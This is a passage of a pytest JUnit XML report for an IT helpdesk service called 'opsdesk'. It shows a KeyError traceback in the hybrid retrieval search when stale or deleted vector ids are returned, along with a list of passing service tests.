+&lt;REPO&gt;/opsdesk/retrieval.py:158: KeyError</failure></testcase><testcase classname="tests.qa.test_stale_vectors" name="test_stale_ids_fall_back_to_exact_bm25_and_disable_index[deleted-id]" time="0.065"><failure message="KeyError: '13371656397125161eaf6f868ad30962b37faa239ae8f56dab1ddbdc0a412e9f'">runtime = (Configuration(database_url='sqlite:////private/var/folders/4s/bpjg_6m151l9tgkgc85zfz600000gn/T/opsdesk-phase2a-el0xqr....service.SupportService object at 0x109e82ab0&gt;, 'a0600e39ecc24e3d97af1b3cb7f5f332', 'd1f42143932146cf993fae9bd2cbd0ac')
+monkeypatch = &lt;_pytest.monkeypatch.MonkeyPatch object at 0x10a0a3e00&gt;
+kind = 'deleted'
+
+    @pytest.mark.parametrize("kind", ["missing", "mixed", "deleted"], ids=["unknown-id", "mixed-valid-stale", "deleted-id"])
+    def test_stale_ids_fall_back_to_exact_bm25_and_disable_index(runtime, monkeypatch, kind):
+        _, db, knowledge, _, _, _ = runtime
+        rows = knowledge.rows()
+        stale = "no-longer-in-sql"
+        if kind == "deleted":
+            stale = rows[0].id
+            with db.session.begin() as session:
+                session.execute(delete(DocumentSegment).where(DocumentSegment.id == stale))
+        baseline = asyncio.run(knowledge.search("VPN"))
+        ids = [stale] if kind != "mixed" else [knowledge.rows()[0].id, stale]
+        collection = attach_vectors(monkeypatch, knowledge, ids)
+&gt;       actual = asyncio.run(knowledge.search("VPN"))
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+&lt;REPO&gt;/tests/qa/test_stale_vectors.py:47: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py:195: in run
+    return runner.run(main)
+           ^^^^^^^^^^^^^^^^
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/runners.py:118: in run
+    return self._loop.run_until_complete(task)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/Users/shawn/.cache/codex-runtimes/codex-primary-runtime/dependencies/python/lib/python3.12/asyncio/base_events.py:691: in run_until_complete
+    return future.result()
+           ^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+self = &lt;opsdesk.retrieval.KnowledgeIndex object at 0x109f57230&gt;, query = 'VPN'
+limit = 4
+
+    async def search(self, query, limit=4):
+        rows = self.rows()
+        if not rows: return []
+        channels = {"bm25": self.lexical(query, rows)}
+        if self.config.vector_search and self.vector_state.get("ready"):
+            try:
+                identity = await embedding_identity(self.config)
+                if identity != self.vector_state["embedding_identity"]:
+                    self.vector_state.update(ready=False, error="Embedding identity changed; rebuild required")
+                    raise ValueError("Vector model changed")
+                vector = (await embed(self.config, ["search_query: " + query]))[0]
+                result = self.collection.query(query_embeddings=[vector], n_results=min(8, len(rows)))
+                channels["vector"] = list(zip(result["ids"][0], result["distances"][0]))
+            except Exception as exc:
+                self.vector_state["last_query_error"] = type(exc).__name__
+        scores, origins = Counter(), {}
+        for channel, ranking in channels.items():
+            for rank, (key, _) in enumerate(ranking[:12], 1):
+                scores[key] += 1 / (40 + rank)
+                origins.setdefault(key, []).append(channel)
+        lookup = {row.id: row for row in rows}
+        requested = set(terms(query))
+        for key in scores:
+&gt;           affinity = len(requested &amp; set(terms(lookup[key].title))) / max(1, len(requested))
+                                                 ^^^^^^^^^^^
+E           KeyError: '13371656397125161eaf6f868ad30962b37faa239ae8f56dab1ddbdc0a412e9f'
+
+&lt;REPO&gt;/opsdesk/retrieval.py:158: KeyError</failure></testcase><testcase classname="tests.qa.test_stale_vectors" name="test_valid_hybrid_preserves_rrf_and_title_reranking" time="0.064" /><testcase classname="tests.qa.test_stale_vectors" name="test_vector_timeout_preserves_bm25_and_records_error" time="0.065" /><testcase classname="tests.qa.test_stale_vectors" name="test_empty_sql_corpus_does_not_query_vectors" time="0.066" /><testcase classname="tests.test_service" name="test_impact_policy[\u5982\u4f55\u7533\u8bf7\u4e1a\u52a1\u7cfb\u7edf\u8bbf\u95ee\u6743\u9650\uff1f-FAQ-P3]" time="0.000" /><testcase classname="tests.test_service" name="test_impact_policy[\u6211\u7684\u7535\u8111\u65e0\u6cd5\u5f00\u673a\uff0c\u53ea\u6709\u6211\u53d7\u5f71\u54cd-INCIDENT-P2]" time="0.000" /><testcase classname="tests.test_service" name="test_impact_policy[\u5168\u5458\u65e0\u6cd5\u8bbf\u95ee\u6838\u5fc3\u4e1a\u52a1\u7cfb\u7edf\uff0c\u670d\u52a1\u4e2d\u65ad-INCIDENT-P1]" time="0.000" /><testcase classname="tests.test_service" name="test_impact_policy[Please install the approved software for me-REQUEST-P2]" time="0.000" /><testcase classname="tests.test_service" name="test_impact_policy[What is the company-wide outage procedure?-FAQ-P3]" time="0.000" /><testcase classname="tests.test_service" name="test_faq_has_evidence_but_no_work_order" time="0.068" /><testcase classname="tests.test_service" name="test_request_replay_conflict_and_ownership" time="0.075" /><testcase classname="tests.test_service" name="test_double_submission_and_action_idempotency" time="0.094" /><testcase classname="tests.test_service" name="test_worker_lease_recovery_and_stale_completion" time="0.075" /><testcase classname="tests.test_service" name="test_retry_budget_dead_letter_and_manual_retry" time="0.102" /><testcase classname="tests.test_service" name="test_sensitive_text_is_not_persisted" time="0.073" /><testcase classname="tests.test_service" name="test_memory_is_bounded_and_sql_fallback" time="0.065" /><testcase classname="tests.test_service" name="test_final_answer_review_targets_generated_text" time="0.000" /><testcase classname="tests.test_service" name="test_graph_parallel_roles_and_dependency_order" time="0.001" /><testcase classname="tests.test_service" name="test_web_auth_origin_roles_sse_and_edit_conflict" time="0.186" /><testcase classname="tests.test_service" name="test_document_import_replacement_and_redaction" time="0.064" /><testcase classname="tests.test_service" name="test_long_document_segments_remain_bounded" time="0.063" /><testcase classname="tests.test_service" name="test_unsafe_generated_draft_is_replaced" time="0.068" /><testcase classname="tests.test_service" name="test_english_procedure_question_overrides_model_request_label" time="0.066" /><testcase classname="tests.test_service" name="test_external_mcp_protocol_auth_and_tools" time="0.146" /></testsuite></testsuites>
